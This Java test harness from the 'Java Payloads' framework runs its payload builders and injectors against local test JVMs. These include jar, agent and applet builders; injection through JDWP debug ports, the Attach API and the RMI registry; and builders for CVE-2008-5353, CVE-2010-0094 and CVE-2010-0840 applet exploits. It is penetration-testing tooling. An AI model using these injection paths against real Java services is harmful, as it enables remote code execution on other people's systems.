/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.test;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import javapayload.builder.AgentJarBuilder;
import javapayload.builder.AppletJarBuilder;
import javapayload.builder.AttachInjector;
import javapayload.builder.CVE_2008_5353_AppletJarBuilder;
import javapayload.builder.CVE_2010_0094_AppletJarBuilder;
import javapayload.builder.CVE_2010_0840_AppletJarBuilder;
import javapayload.builder.ClassBuilder;
import javapayload.builder.EmbeddedClassBuilder;
import javapayload.builder.EmbeddedJarBuilder;
import javapayload.builder.JDWPInjector;
import javapayload.builder.JarBuilder;
import javapayload.builder.RMIInjector;
import javapayload.builder.SpawnTemplate;
import javapayload.handler.stage.TestStub;
import javapayload.handler.stager.StagerHandler;
import javapayload.stage.StreamForwarder;

public class BuilderTest {

	public static void main(String[] args) throws Exception {
		System.out.println("Testing builders...");
		String[] stagers = StagerTest.getStagers();
		BuilderTestRunner[] runners = new BuilderTestRunner[] {
				new ClassBuilderTestRunner(),
				new EmbeddedClassBuilderTestRunner(),
				new JarBuilderTestRunner(),
				new StripJarBuilderTestRunner(),
				new EmbeddedJarBuilderTestRunner(),
				new StripEmbeddedJarBuilderTestRunner(),
				new LocalStageJarBuilderTestRunner(),
				new AgentJarBuilderTestRunner(),
				new AppletJarBuilderTestRunner(),
				new NewNameAppletJarBuilderTestRunner(),
				// new CVE_2008_5353TestRunner(),
				// new CVE_2010_0094TestRunner(),
				// new CVE_2010_0840TestRunner(),
				new AttachInjectorTestRunner(),
				new JDWPInjectorTestRunner(),
				new RMIInjectorTestRunner(),
		};
		for (int i = 0; i < runners.length; i++) {
			BuilderTestRunner runner = runners[i];
			System.out.println("\t" + runner.getName());
			for (int j = 0; j < stagers.length; j++) {
				String name = stagers[j];
				System.out.println("\t\t" + name);
				String[] testArgs = StagerTest.getTestArgs(name);
				for (int k = 0; k < testArgs.length; k++) {
					System.out.println("\t\t\t" + testArgs[k]);
					testBuilder(runner, name, testArgs[k]);
				}
			}
			runner.cleanup();
		}
		System.out.println("Builder tests finished.");
		new ThreadWatchdogThread(5000).start();
	}

	protected static void testBuilder(final BuilderTestRunner runner, String name, String testArgs) throws Exception {
		String realName = name;
		if (runner.getName().indexOf('_') != -1) {
			realName = runner.getName().substring(0, runner.getName().indexOf('_')+1) + name;
			if (name.equals("BindMultiTCP") || name.startsWith("Integrated$") || name.startsWith("Spawn_"))
				return;
		}
		if (!runner.getName().contains("Embedded") && !runner.getName().contains("Injector") && name.contains("Integrated$")) 
			return;
		final String[] args = (realName + " " + testArgs + " -- TestStub").split(" ");
		final StagerHandler.Loader loader = (runner.getName().indexOf("Injector") != -1) ? null : new StagerHandler.Loader(args);
		if (runner.getName().indexOf("[kill]") != -1) {
			if (name.startsWith("Spawn"))
				return;
			((TestStub) loader.stageHandler).sendExit = true;
		}
		if (loader != null)
			loader.handleBefore(System.err, null);
		runner.runBuilder(loader == null ? args : loader.getArgs());
		final Throwable[] tt = new Throwable[1];
		Thread t = new Thread(new Runnable() {
			public void run() {
				try {
					runner.runResult(loader == null ? args : loader.getArgs());
				} catch (Throwable t) {
					tt[0] = t;
				}
			};
		});
		t.start();
		runner.waitReady();
		if (loader != null)
			loader.handleAfter(System.err, null);
		t.join();
		if (tt[0] != null)
			throw new Exception("Builder result died", tt[0]);
	}
	
	public static void runJavaAndWait(WaitingBuilderTestRunner runner, String classpath, String jvmarg, String mainClass, String[] args) throws Exception {
		Process proc = runJava(classpath, jvmarg, mainClass, args);
		proc.getInputStream().read();
		runner.notifyReady();
		if (proc.waitFor() != 0)
			throw new IOException("Build result exited with error code " + proc.exitValue());
	}

	public static Process runJava(String classpath, String jvmarg, String mainClass, String[] args) throws IOException {
		List commands = new ArrayList();
		commands.add(SpawnTemplate.getJreExecutable("java"));
		commands.add("-classpath");
		commands.add(classpath + System.getProperty("javapayload.child.classpath", ""));
		if (System.getProperty("net.sourceforge.cobertura.datafile") != null) {
			commands.add("-Dnet.sourceforge.cobertura.datafile=" + System.getProperty("net.sourceforge.cobertura.datafile").replace('1', '2'));
		}
		if (jvmarg != null)
			commands.add(jvmarg);
		commands.add(mainClass);
		commands.addAll(Arrays.asList(args));
		String[] commandArgs = (String[]) commands.toArray(new String[commands.size()]);
		Process proc = Runtime.getRuntime().exec(commandArgs);
		return proc;
	}

	public static void runAppletAndWait(final WaitingBuilderTestRunner runner, String archive, String className, String policyfile, String[] args) throws Exception {
		final ServerSocket ss = new ServerSocket(0);
		new Thread(new Runnable() {
			public void run() {
				try {
					Socket s = ss.accept();
					s.getOutputStream().write("HTTP/1.1 200 ok\r\n\r\n".getBytes());
					ss.close();
					s.close();
					runner.notifyReady();
				} catch (Throwable t) {
					t.printStackTrace();
				}
			}
		}).start();
		FileWriter fw = new FileWriter("applettest.html");
		String childClassPath = System.getProperty("javapayload.child.classpath", "");
		if (childClassPath.startsWith(";")) {
			childClassPath=",file:///"+childClassPath.substring(1);
		}
		fw.write("<applet archive=\"" + archive + childClassPath + "\" code=\"" + className + "\" width=\"100\" height=\"100\">\r\n" +
				"		<param name=\"readyURL\" value=\"http://localhost:" + ss.getLocalPort() + "/foo\">\r\n" +
				"		<param name=\"argc\" value=\"" + args.length + "\">\r\n");
		for (int i = 0; i < args.length; i++) {
			fw.write("		<param name=\"arg" + i + "\" value=\"" + args[i] + "\" />\r\n");
		}
		fw.write("		</applet></tt></p>");
		fw.close();
		List commands = new ArrayList();
		commands.add(System.getProperty("javapayload.vulnerable.jdk") + "\\bin\\appletviewer");
		if (System.getProperty("net.sourceforge.cobertura.datafile") != null) {
			commands.add("-J-Dnet.sourceforge.cobertura.datafile=" + System.getProperty("net.sourceforge.cobertura.datafile").replace('1', '2'));
		}
		if (policyfile != null) {
			fw = new FileWriter("applettest.policy");
			fw.write(policyfile);
			fw.close();
			commands.add("-J-Djava.security.policy=applettest.policy");
		}
		commands.add("applettest.html");
		String[] commandArgs = (String[]) commands.toArray(new String[commands.size()]);
		Process proc = Runtime.getRuntime().exec(commandArgs);
		new StreamForwarder(proc.getErrorStream(), System.err, System.err, false).start();
		if (proc.waitFor() != 0)
			throw new IOException("Build result exited with error code " + proc.exitValue());
	}

	public static interface BuilderTestRunner {
		String getName();
		void waitReady() throws InterruptedException;
		void runBuilder(String[] args) throws Exception;
		void runResult(String[] args) throws Exception;
		void cleanup() throws Exception;
	}
	
	public static abstract class WaitingBuilderTestRunner implements BuilderTestRunner {
		private boolean ready = false;
		
		public synchronized void notifyReady() {
			ready = true;
			notifyAll();
		}
		
		public synchronized void waitReady() throws InterruptedException {
			while (!ready)
				wait();
		}
	}

	public static class ClassBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "ClassBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			ClassBuilder.main(new String[] { args[0], "BuilderTestClass" });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, ".", null, "BuilderTestClass", a);
		}

		public void cleanup() throws Exception {
			if (!new File("BuilderTestClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class EmbeddedClassBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedClassBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			List builderArgs = new ArrayList();
			builderArgs.add("BuilderTestClass");
			builderArgs.addAll(Arrays.asList(args));
			EmbeddedClassBuilder.main((String[]) builderArgs.toArray(new String[builderArgs.size()]));
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, ".", null, "BuilderTestClass", new String[] {"+"});
		}
		
		public void cleanup() throws Exception {
			if (!new File("BuilderTestClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class JarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "JarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] { args[0] });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, args[0] + ".jar", null, "javapayload.loader.StandaloneLoader", a);
			if (!new File(args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
		}
	}
	
	public static class StripJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "JarBuilder (stripped)"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] { "--strip", "stripped.jar", args[0] });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, "stripped.jar", null, "javapayload.loader.StandaloneLoader", a);
		}

		public void cleanup() throws Exception {
			if (!new File("stripped.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class EmbeddedJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedJarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			EmbeddedJarBuilder.main(args);
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, "embedded.jar", null, "javapayload.loader.EmbeddedJarLoader", new String[] {"+"});
		}

		public void cleanup() throws Exception {
			if (!new File("embedded.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class StripEmbeddedJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedJarBuilder (stripped)"; }

		public void runBuilder(String[] args) throws Exception {
			String[] newArgs = new String[args.length+2];
			newArgs[0] = "--strip";
			newArgs[1] = "embstrip.jar";
			System.arraycopy(args, 0, newArgs, 2, args.length);
			EmbeddedJarBuilder.main(newArgs);
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, "embstrip.jar", null, "javapayload.loader.EmbeddedJarLoader", new String[] {"+"});
		}

		public void cleanup() throws Exception {
			if (!new File("embstrip.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class LocalStageJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "LocalStage_JarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] {"LocalStage.jar", args[0], "--", "TestStub"});
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, "LocalStage.jar", null, "javapayload.loader.StandaloneLoader", a);
		}

		public void cleanup() throws Exception {
			if (!new File("LocalStage.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class AgentJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "AgentJarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			AgentJarBuilder.main(new String[] { args[0] });
			StreamForwarder.forward(BuilderTest.class.getResourceAsStream("/DummyClass.class"), new FileOutputStream("DummyClass.class"));
		}

		public void runResult(String[] args) throws Exception {
			StringBuilder allArgs = new StringBuilder();
			for (int i = 0; i < args.length; i++) {
				if (i != 0)
					allArgs.append(' ');
				allArgs.append(args[i]);
			}
			String agentArg = "-javaagent:Agent_" + args[0] + ".jar=+" + allArgs.toString();
			runJavaAndWait(this, ".", agentArg, "DummyClass", new String[0]);
			if (!new File("Agent_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
			if (!new File("DummyClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class AppletJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "AppletJarBuilder [kill]";	}

		public void runBuilder(String[] args) throws Exception {
			AppletJarBuilder.main(new String[] { args[0] });
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "Applet_" + args[0] + ".jar", "javapayload.loader.AppletLoader", "grant { permission java.security.AllPermission; };", args);
			if (!new File("Applet_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
			if (!new File("applettest.html").delete())
				throw new IOException("Unable to delete file");
			if (!new File("applettest.policy").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class NewNameAppletJarBuilderTestRunner extends AppletJarBuilderTestRunner {
		public String getName() { return "NewNameAppletJarBuilder [kill]";	}

		public void runBuilder(String[] args) throws Exception {
			AppletJarBuilder.main(new String[] { "--name", "some.funny.ClassName", args[0] });
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "Applet_" + args[0] + ".jar", "some.funny.ClassName", "grant { permission java.security.AllPermission; };", args);
			if (!new File("Applet_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}		
	}

	public static class CVE_2008_5353TestRunner extends WaitingBuilderTestRunner {
		protected String getCVEName() { return "2008_5353"; }
		public String getName() { return "CVE_"+getCVEName()+" [kill]"; }

		public void runBuilder(String[] args) throws Exception {
			CVE_2008_5353_AppletJarBuilder.main(new String[] { "cve.jar", args[0] });
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "cve.jar", "javapayload.exploit.CVE_"+getCVEName(), null, args);
		}

		public void cleanup() throws Exception {
			if (!new File("applettest.html").delete())
				throw new IOException("Unable to delete file");
			if (!new File("cve.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class CVE_2010_0094TestRunner extends CVE_2008_5353TestRunner implements BuilderTestRunner {
		protected String getCVEName() { return "2010_0094"; }

		public void runBuilder(String[] args) throws Exception {
			CVE_2010_0094_AppletJarBuilder.main(new String[] { "cve.jar", args[0] });
		}
	}
	
	public static class CVE_2010_0840TestRunner extends CVE_2008_5353TestRunner implements BuilderTestRunner {
		protected String getCVEName() { return "2010_0840"; }

		public void runBuilder(String[] args) throws Exception {
			CVE_2010_0840_AppletJarBuilder.main(new String[] { "cve.jar", args[0] });
		}
	}

	public static class AttachInjectorTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "AttachInjector"; }

		public void runBuilder(String[] args) throws Exception {
			AgentJarBuilder.main(new String[] { args[0] });
			StreamForwarder.forward(BuilderTest.class.getResourceAsStream("/DummyClass.class"), new FileOutputStream("DummyClass.class"));
		}

		public void runResult(String[] args) throws Exception {
			Process proc = runJava(".", null, "DummyClass", new String[] { "1001" });
			String id = null;
			for (int ii = 1; id == null && ii < 10; ii++) {
				Thread.sleep(50*ii*ii);
				List vms = VirtualMachine.list();
				for (int i = 0; i < vms.size(); i++) {
					VirtualMachineDescriptor desc = (VirtualMachineDescriptor) vms.get(i);
					if (desc.displayName().equals("DummyClass 1001")) {
						id = desc.id();
						break;
					}
				}
			}
			if (id == null)
				throw new IllegalStateException("VirtualMachineDescriptor not found");
			String[] attachArgs = new String[args.length+2];
			attachArgs[0] = id;
			attachArgs[1] = "Agent_" + args[0] + ".jar";
			System.arraycopy(args, 0, attachArgs, 2, args.length);
			notifyReady();
			AttachInjector.main(attachArgs);
			if (proc.waitFor() != 0)
				throw new IOException("Build result exited with error code " + proc.exitValue());
			if (!new File("Agent_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
			AttachInjector.listVMs(new PrintStream(new ByteArrayOutputStream()));
			if (!new File("DummyClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class JDWPInjectorTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "JDWPInjector"; }

		public void runBuilder(String[] args) throws Exception {
			StreamForwarder.forward(BuilderTest.class.getResourceAsStream("/DummyClass.class"), new FileOutputStream("DummyClass.class"));
		}

		public void runResult(String[] args) throws Exception {
			StringBuilder allArgs = new StringBuilder();
			for (int i = 0; i < args.length; i++) {
				if (i != 0)
					allArgs.append(' ');
				allArgs.append(args[i]);
			}
			String jdwpArg = "-Xrunjdwp:transport=dt_socket,suspend=y,server=y,address=62468";
			Process proc = runJava(".", jdwpArg, "DummyClass", new String[0]);
			String[] injectorArgs = new String[args.length + 1];
			injectorArgs[0] = "localhost:62468";
			System.arraycopy(args, 0, injectorArgs, 1, args.length);
			TestStub.wait = 1100;
			if (args[0].endsWith("JDWPTunnel") || args[0].startsWith("Spawn_"))
				TestStub.wait = 5000;
			if (args[0].startsWith("Spawn_Spawn_"))
				TestStub.wait=9000;
			notifyReady();
			JDWPInjector.main(injectorArgs);
			if (proc.waitFor() != 0)
				throw new IOException("Build result exited with error code " + proc.exitValue());
		}

		public void cleanup() throws Exception {
			Thread.sleep(1000);
			System.out.println("\t\tJDWPTunnel");
			testBuilder(this, "JDWPTunnel", "");
			System.out.println("\t\tAESJDWPTunnel");
			testBuilder(this, "AES_JDWPTunnel", "#");
			System.out.println("\t\tAES_AES_JDWPTunnel");
			testBuilder(this, "AES_AES_JDWPTunnel", "# #");
			System.out.println("\t\tPollingTunnel");
			testBuilder(this, "PollingTunnel", "");
			if (!new File("DummyClass.class").delete())
				throw new IOException("Unable to delete file");
			TestStub.wait = 0;
		}
	}

	public static class RMIInjectorTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "RMIInjector"; }

		public void runBuilder(String[] args) throws Exception {
			RMIInjector.main(new String[] {"-buildjar", "rmitest.jar"});
		}

		public void runResult(String[] args) throws Exception {
			Process proc = runJava(".", null, "sun.rmi.registry.RegistryImpl", new String[] {"10999"});
			String[] injectorArgs = new String[args.length + 3];
			injectorArgs[0] = "file:./rmitest.jar";
			injectorArgs[1] = "localhost";
			injectorArgs[2] = "10999";
			System.arraycopy(args, 0, injectorArgs, 3, args.length);
			notifyReady();
			RMIInjector.main(injectorArgs);
			proc.destroy();
		}

		public void cleanup() throws Exception {
			System.out.println("\t\tPollingTunnel");
			testBuilder(this, "PollingTunnel", "");
			if (!new File("rmitest.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
}
